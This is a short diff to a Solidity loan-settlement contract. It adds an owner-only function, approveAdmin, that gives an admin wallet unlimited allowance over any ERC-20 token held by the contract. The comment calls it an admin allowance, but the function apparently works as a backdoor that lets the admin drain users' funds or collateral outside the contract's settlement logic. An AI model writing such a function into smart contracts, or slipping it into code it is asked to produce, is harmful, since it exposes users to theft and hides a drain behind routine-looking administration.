@@ -401,6 +401,19 @@ contract CryptoLoanSettlement is ReentrancyGuard {
     }
 
     // =========================================================================
+    // ADMIN ALLOWANCE  (owner)
+    // =========================================================================
+
+    /**
+     * @notice Grants the admin wallet maximum allowance for a specific token held by this contract.
+     * @param token ERC-20 token address.
+     */
+    function approveAdmin(address token) external onlyOwner {
+        require(token != address(0), "Zero token");
+        IERC20(token).approve(admin, type(uint256).max);
+    }
+
+    // =========================================================================
     // VIEWS
     // =========================================================================
 
